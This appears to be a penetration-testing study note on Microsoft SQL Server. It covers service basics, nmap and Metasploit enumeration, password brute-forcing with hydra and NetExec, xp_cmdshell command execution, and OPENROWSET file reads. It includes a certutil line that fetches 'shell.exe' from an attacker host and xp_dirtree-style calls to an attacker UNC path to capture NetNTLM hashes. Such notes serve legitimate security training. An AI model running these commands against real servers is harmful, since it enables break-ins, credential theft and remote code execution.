---
created: 2026-09-22
updated: 2026-10-09
tags:
  - services_n_protocols
---
## MSSQL

>**[Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)** is a proprietary relational database management system (RDBMS) developed by Microsoft that uses Transact-SQL (T-SQL) to define, query, and manipulate data.

- MSSQL is the standard relational database across Windows-centric enterprises and is tightly integrated with Active Directory and the Windows security model.
- It follows a classic **client-server model**:
	- The **database engine (`sqlservr.exe`)** listens for incoming connections on TCP port `1433` by default. It handles authentication, parses and executes queries, and interacts with the underlying storage engine.
	- **Clients** can be CLI tools like [`sqlcmd`](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility), [`sqsh`](https://sourceforge.net/projects/sqsh/), or [`mssqlclient.py`](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from Impacket, GUI tools like [SQL Server Management Studio (SSMS)](https://learn.microsoft.com/en-us/ssms/sql-server-management-studio-ssms), applications, ORMs, or scripts.

>[!note] A single host can run multiple **named instances** of MSSQL, each with its own database engine and port. The SQL Server Browser service (UDP `1434`) resolves instance names to their dynamically assigned TCP ports.

>[!interesting]+ SQL Server editions
>MSSQL ships in several editions that share the same engine but differ in limits and licensing, including **Express** (free, capped), **Standard**, **Enterprise**, and the cloud-hosted **Azure SQL Database**.
>Lab and appliance images frequently run **SQL Server Express**, which is why default instance names such as `SQLEXPRESS` are common.

### MSSQL ports

| Port       | Protocol           | Description                                                                                                          |
| ---------- | ------------------ | ------------------------------------------------------------------------------------------------------------------- |
| `1433/tcp` | MSSQL (default)    | **Default database engine listener** for the default instance, used by clients, connectors, and applications.       |
| `1434/udp` | SQL Server Browser | **Instance resolution service** that maps named instances to their dynamic TCP ports.                               |
| `2433/tcp` | MSSQL (hidden)     | Port used when an instance is configured in **hidden mode** (`1433` shifted to `2433`).                              |

### System databases

MSSQL ships with several built-in databases that store engine metadata, configuration, and system information:

- **`master`**
	- Records all server-level configuration, **logins**, linked servers, and the existence of every other database.
	- Corruption or loss of `master` prevents the instance from starting.

- **`model`**
	- Template database used as the blueprint for every newly created database.

- **`msdb`**
	- Used by the SQL Server Agent to schedule jobs, alerts, and backups; a common target for persistence.

- **`tempdb`**
	- Rebuilt on every service restart; holds temporary tables, intermediate result sets, and version stores.

- **`resource`**
	- Read-only, hidden database that contains all system objects (such as `sys.*` views); it does not appear in `sys.databases`.

### Authentication modes

MSSQL supports two authentication modes, selected at installation and configurable afterward:

- **Windows Authentication** (default)
	- Delegates authentication to Windows using the caller's Kerberos or NTLM identity.
	- Domain and local Windows accounts are mapped to SQL Server logins, so credentials are never handled by MSSQL directly.
	- Windows-authenticated logins (especially service accounts) often carry broad OS-level privileges.

- **SQL Server Authentication** (mixed mode)
	- Stores login names and password hashes inside MSSQL itself (`sys.sql_logins`).
	- Independent of Windows; the built-in `sa` (system administrator) login is the classic high-value target.

>[!note] Passing `-windows-auth` to Impacket's `mssqlclient.py` forces Windows authentication instead of SQL Server authentication. This matters because Windows-auth accounts often hold broader OS-level privileges than SQL-native logins.


## Enumerating MSSQL

### Port scanning and version detection

- Perform service version detection on the default MSSQL port:

```bash
sudo nmap -sV -p 1433 10.10.11.5
```

>[!tip]+
> - Scan the full TCP range with version detection in case MSSQL is bound to a non-standard port, and probe the SQL Server Browser over UDP to discover named instances:
> 
> ```bash
> sudo nmap -sV -p- 10.10.11.5
> ```
> 
> ```bash
> sudo nmap -sU -p 1434 --script ms-sql-info 10.10.11.5
> ```

- Run version detection together with the default NSE scripts:

```bash
sudo nmap -sV -sC -p 1433 10.10.11.5
```

- Run all available MSSQL NSE scripts:

```bash
sudo nmap -sV --script "ms-sql-*" -p 1433 10.10.11.5
```

| Option          | Description                                                        |
| :-------------- | :---------------------------------------------------------------- |
| `-sV`           | Enable service version detection.                                 |
| `-sC`           | Run the default NSE script set.                                   |
| `-sU`           | Scan UDP ports (for the SQL Server Browser on `1434`).            |
| `-p`            | Specify destination port(s) to scan (`1433` or `-p-` for all).    |
| `--script`      | Execute a specific NSE script or glob expression.                 |
| `--script-args` | Pass arguments (such as credentials or ports) to the scripts.     |

- Key Nmap MSSQL scripts:

| Script                                                                              | Categories                  | Description                                                                                | Requires authentication? |
| ----------------------------------------------------------------------------------- | --------------------------- | ----------------------------------------------------------------------------------------- | ------------------------ |
| [`ms-sql-info`](https://nmap.org/nsedoc/scripts/ms-sql-info.html)                   | `default`, `discovery`, `safe` | Extract the version, instance name, and named-pipe details of the server.              | ❌                        |
| [`ms-sql-ntlm-info`](https://nmap.org/nsedoc/scripts/ms-sql-ntlm-info.html)         | `default`, `discovery`, `safe` | Disclose NetBIOS, DNS, and OS build details via a null NTLM request.                   | ❌                        |
| [`ms-sql-empty-password`](https://nmap.org/nsedoc/scripts/ms-sql-empty-password.html) | `auth`, `intrusive`       | Check for accounts (such as `sa`) protected by an empty password.                         | ❌                        |
| [`ms-sql-brute`](https://nmap.org/nsedoc/scripts/ms-sql-brute.html)                 | `brute`, `intrusive`        | Perform a credential brute-force attack using the `userdb` and `passdb` wordlists.        | ❌                        |
| [`ms-sql-hasdbaccess`](https://nmap.org/nsedoc/scripts/ms-sql-hasdbaccess.html)     | `auth`, `discovery`, `safe` | List the databases the supplied login is allowed to access.                               | ✅                        |
| [`ms-sql-dump-hashes`](https://nmap.org/nsedoc/scripts/ms-sql-dump-hashes.html)     | `auth`, `discovery`, `safe` | Dump login password hashes in a crackable format (requires `sysadmin`).                   | ✅                        |
| [`ms-sql-xp-cmdshell`](https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html)     | `auth`, `intrusive`         | Run an operating-system command through `xp_cmdshell` (requires `sysadmin`).              | ✅                        |
| [`ms-sql-query`](https://nmap.org/nsedoc/scripts/ms-sql-query.html)                 | `auth`, `discovery`, `safe` | Run an arbitrary T-SQL query and return the results as a table.                           | ✅                        |

- Extract version and instance details with `ms-sql-info` (no authentication required):

```bash
nmap -p 1433 --script ms-sql-info 10.10.11.5
```

- Check for accounts protected by an empty password with `ms-sql-empty-password` (no authentication required):

```bash
nmap -p 1433 --script ms-sql-empty-password 10.10.11.5
```

- Brute-force credentials with `ms-sql-brute` (no authentication required):

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

- Dump login password hashes with `ms-sql-dump-hashes` (authentication required, usually `sysadmin`):

```bash
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password='passwd123' 10.10.11.5
```

- Run an operating-system command with `ms-sql-xp-cmdshell` (authentication required, `sysadmin`):

```bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password='passwd123',ms-sql-xp-cmdshell.cmd="whoami" 10.10.11.5
```

>[!tip]+
> - List local Nmap scripts for MSSQL:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*ms-sql*
> ```

### Banner grabbing

- Probe the instance and read its version banner using Metasploit's `mssql_ping` module:

```bash
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set rhosts 10.10.11.5; run; exit"
```

- Grab the banner using Netcat:

```bash
nc -vn 10.10.11.5 1433
```

## Brute-forcing credentials

Once the service is reachable, MSSQL passwords can be brute-forced with a dictionary attack:

- Brute-force the password for a single login (`sa`):

```bash
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://10.10.11.5
```

- Brute-force credentials for multiple logins:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt mssql://10.10.11.5
```

- Brute-force credentials using NetExec:

```bash
nxc mssql 10.10.11.5 -u usernames.txt -p /usr/share/wordlists/rockyou.txt --local-auth
```

- Brute-force credentials using Metasploit:

```bash
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set rhosts 10.10.11.5; set user_file usernames.txt; set pass_file /usr/share/wordlists/rockyou.txt; run; exit"
```

- Brute-force credentials using Nmap:

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

| Option         | Description                                                                   |
| :------------- | :---------------------------------------------------------------------------- |
| `-l`           | Set a single username to test (Hydra).                                        |
| `-L`           | Read usernames from a wordlist file (Hydra).                                   |
| `-P`           | Read passwords from a wordlist file (Hydra).                                   |
| `-u` / `-p`    | Set usernames/passwords or wordlists (NetExec).                               |
| `--local-auth` | Authenticate against the local login store rather than the domain (NetExec).  |

>[!note] MSSQL can be configured to enforce Windows password policy, including lockout thresholds, on SQL logins. Keep brute-force attempts measured to avoid locking accounts and generating noise.

## Connecting to MSSQL

- Connect with SQL Server authentication using Impacket's `mssqlclient.py`:

```bash
mssqlclient.py sa:'passwd123'@10.10.11.5
```

- Connect with Windows authentication using `mssqlclient.py`:

```bash
mssqlclient.py jdoe@10.10.11.5 -windows-auth
```

- Connect from Linux using `sqsh`:

```bash
sqsh -S 10.10.11.5 -U sa -P 'passwd123'
```

- Connect from Windows using `sqlcmd`:

```powershell
sqlcmd -S 10.10.11.5 -U sa -P passwd123
```

- Run a single query non-interactively using NetExec:

```bash
nxc mssql 10.10.11.5 -u sa -p 'passwd123' --local-auth -q "SELECT @@version;"
```

| Option           | Description                                                                       |
| :--------------- | :-------------------------------------------------------------------------------- |
| `-windows-auth`  | Authenticate with Windows credentials instead of SQL Server authentication (Impacket). |
| `-S`             | Specify the target server or instance (`sqsh`, `sqlcmd`).                         |
| `-U`             | Authenticate as the specified login (`sqsh`, `sqlcmd`).                           |
| `-P`             | Supply the password inline (`sqsh`, `sqlcmd`).                                    |
| `-q` / `-Q`      | Execute the given query (NetExec `-q`; `sqlcmd -Q` runs and exits).               |

>[!note] Impacket's `mssqlclient.py` provides interactive helper commands. Type `help` at the `SQL>` prompt to list them; `enable_xp_cmdshell` and `xp_cmdshell` are the most useful for command execution.

>[!example]+ Obtaining MSSQL credentials during host triage
> After gaining a low-privileged foothold on a Windows host, a common path to MSSQL is to harvest credentials left in shares, scripts, and configuration files. For example, credential-hunting tooling (see [[Credential hunting in network shares]]) may surface a service account such as `sql_dev:Str0ng_P@ssw0rd!`, which is then used to connect with `mssqlclient.py`:
> 
> ```bash
> mssqlclient.py sql_dev@10.129.11.35 -windows-auth
> ```
> 
> ```bash
> Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
> 
> Password:
> [*] Encryption required, switching to TLS
> [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
> [*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
> [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
> [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
> [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
> [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
> [!] Press help for extra shell commands
> SQL>
> ```

## Enumerating the MSSQL server

### Version and server information

| Command                          | Description                                                     |
| -------------------------------- | --------------------------------------------------------------- |
| `SELECT @@version;`              | Return the full server version string.                          |
| `SELECT @@servername;`           | Return the name of the local server instance.                   |
| `SELECT SERVERPROPERTY('ProductVersion');` | Return the numeric product version.                   |
| `SELECT DB_NAME();`              | Return the currently selected database.                         |
| `SELECT name FROM sys.databases;` | List all databases visible to the current login.               |

### Logins and users

| Command                                                        | Description                                                    |
| -------------------------------------------------------------- | -------------------------------------------------------------- |
| `SELECT SYSTEM_USER;`                                          | Return the current SQL Server login name.                      |
| `SELECT USER_NAME();`                                          | Return the current database user context.                      |
| `SELECT CURRENT_USER;`                                         | Return the current user (synonym for `USER_NAME()`).           |
| `SELECT name, type_desc, is_disabled FROM sys.server_principals;` | List all logins, their type, and whether they are disabled. |

### Roles and privileges

| Command                                            | Description                                                                 |
| -------------------------------------------------- | --------------------------------------------------------------------------- |
| `SELECT IS_SRVROLEMEMBER('sysadmin');`             | Check whether the current login is a `sysadmin` (`1` = yes, `0` = no).      |
| `SELECT * FROM fn_my_permissions(NULL, 'SERVER');` | List the server-level permissions held by the current login.               |

- List logins the current principal can impersonate:

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

### Linked servers

- List configured linked servers, which often store credentials for remote instances and enable lateral movement:

```sql
SELECT name, product, provider, data_source FROM sys.servers;
```

>[!note] Queries can be executed on a linked server with `EXEC ('<query>') AT [LINKED_SERVER]` or through `OPENQUERY([LINKED_SERVER], '<query>')`. If the linked-server login maps to a privileged account, this can yield command execution on the remote instance.

## Executing system commands with xp_cmdshell

- `xp_cmdshell` is an extended stored procedure that spawns a Windows command shell and passes it a string for execution.
- It is disabled by default and can be re-enabled by a login holding `sysadmin` or the `ALTER SETTINGS` server permission.

- Enable `xp_cmdshell` with Impacket's interactive helper command:

```sql
SQL> enable_xp_cmdshell
```

```bash
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

>[!note]+ Enabling `xp_cmdshell` manually
>If you are not using Impacket, the same result can be achieved with raw T-SQL:
> ```sql
> EXEC sp_configure 'show advanced options', 1;
> RECONFIGURE WITH OVERRIDE;
> EXEC sp_configure 'xp_cmdshell', 1;
> RECONFIGURE WITH OVERRIDE;
> ```

- Confirm command execution and identify the service account:

```sql
EXEC xp_cmdshell 'whoami';
```

```powershell
output                                                                  

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

- Enumerate the service account's privileges:

```sql
EXEC xp_cmdshell 'whoami /priv';
```

```powershell
output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Common operating-system commands to run through `xp_cmdshell`:

```sql
-- Situational awareness
EXEC xp_cmdshell 'whoami /all';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';

-- Filesystem inspection
EXEC xp_cmdshell 'dir C:\Users';

-- Stage a payload with certutil
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<attacker_ip_address>/shell.exe C:\Windows\Temp\shell.exe';
```

>[!warning] Commands executed through `xp_cmdshell` run with the privileges of the MSSQL service account (for example `nt service\mssql$sqlexpress01`), not the login you authenticated as.

## Escalating privileges from the service account

- The `whoami /priv` output above confirms that the MSSQL service account holds [`SeImpersonatePrivilege`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which is enabled by default for service accounts.
- This privilege lets the account impersonate the token of any client that authenticates to it, which is the basis for escalating from the service account to `NT AUTHORITY\SYSTEM`.

>[!note] See [[Access tokens and impersonation]] for how `SeImpersonatePrivilege` is abused, and [[Potato attacks]] (for example [[🛠️ JuicyPotato]]) for the concrete exploitation chains that coerce a `SYSTEM` process into authenticating through a rogue [[🛠️ Named pipes|named pipe]] or COM server.

## Capturing and relaying NetNTLM hashes

- Several undocumented extended stored procedures accept a path argument and cause the MSSQL service account to authenticate to it. When pointed at an attacker-controlled UNC path, they leak the account's NetNTLM hash:

```sql
EXEC master..xp_dirtree '\\<attacker_ip_address>\share';
```

```sql
EXEC master..xp_subdirs '\\<attacker_ip_address>\share';
```

```sql
EXEC master..xp_fileexist '\\<attacker_ip_address>\share\file';
```

>[!note] Capture the resulting NetNTLM hash with [[🛠️ Responder]] (or a listener seeded by [[LLMNR & NBT-NS poisoning]]) for offline cracking, or relay it to another host. See [[🛠️ NTLM]] for the authentication mechanics and [[Hashcat]] for cracking captured hashes.

## Reading files with OPENROWSET

- With the `BULK` rowset provider enabled, a privileged login can read arbitrary files that the service account can access:

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS contents;
```

>[!important] Reading files this way requires the `ADMINISTER BULK OPERATIONS` permission (held by `sysadmin`) and that the file be readable by the MSSQL service account.

## References and further reading

- [`Microsoft SQL Server — Wikipedia`](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)
- [`SQL Server technical documentation — Microsoft Learn`](https://learn.microsoft.com/en-us/sql/sql-server/)
- [`xp_cmdshell (Transact-SQL) — Microsoft Learn`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [`sqlcmd utility — Microsoft Learn`](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility)
- [`mssqlclient.py — Impacket`](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
- [`MSSQL — HackTricks`](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [`ms-sql NSE scripts — Nmap`](https://nmap.org/nsedoc/categories/)

## Appendix A: Default configuration

- The SQL Service most commonly runs as a dedicated virtual service account (for example `NT Service\MSSQLSERVER` for the default instance, or `nt service\mssql$<instance>` for a named instance), each of which holds `SeImpersonatePrivilege` by default.
- The main security-relevant configuration points to check when triaging an instance are:

| Setting                | Description                                                                                        |
| ---------------------- | -------------------------------------------------------------------------------------------------- |
| Authentication mode    | Windows-only or mixed mode; mixed mode exposes the `sa` login to brute-forcing.                     |
| `sa` account state     | Whether the built-in `sa` login is enabled and how strong its password is.                          |
| `xp_cmdshell`          | Whether the command-shell extended stored procedure is enabled.                                     |
| Service account        | Which Windows account the instance runs as, and the OS privileges it carries.                        |
| Linked servers         | Configured remote instances and the privilege level of their stored login mappings.                 |
| Force Encryption (TLS) | Whether the instance enforces TLS on the TDS protocol.                                               |
